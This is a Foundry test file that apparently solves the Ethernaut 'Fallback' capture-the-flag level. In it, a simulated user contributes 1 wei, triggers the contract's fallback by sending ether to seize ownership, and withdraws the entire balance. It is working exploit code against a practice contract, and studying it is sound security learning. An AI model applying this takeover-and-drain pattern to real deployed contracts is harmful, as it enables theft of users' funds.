// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import { Fallback } from "../../src/2/Fallback.sol";

contract CounterTest is Test {
    Fallback public _contract;
    address owner;
    address user = makeAddr('Rory');
    function setUp() public {
        owner = address(this);
        _contract = new Fallback();
        vm.deal(user, 1 ether);
    }

    function test_Fallback() public {

      address o = _contract.owner();
      console.log("Now Owner: ", o);
      console.log("User: ", user);
      vm.startPrank(user);
      _contract.contribute{value: 1 wei}();
      o = _contract.owner();
      console.log("Now Owner: ", o);
      (bool success,) = payable(address(_contract)).call{value: 1 wei}("");
      require(success);
      o = _contract.owner();
      console.log("Now Owner: ", o);
      _contract.withdraw();
      assert(payable(address(_contract)).balance == 0);

        //assert(ethernaut.submitLevelInstance(payable(levelAddress)));
      vm.stopPrank();
    }


}
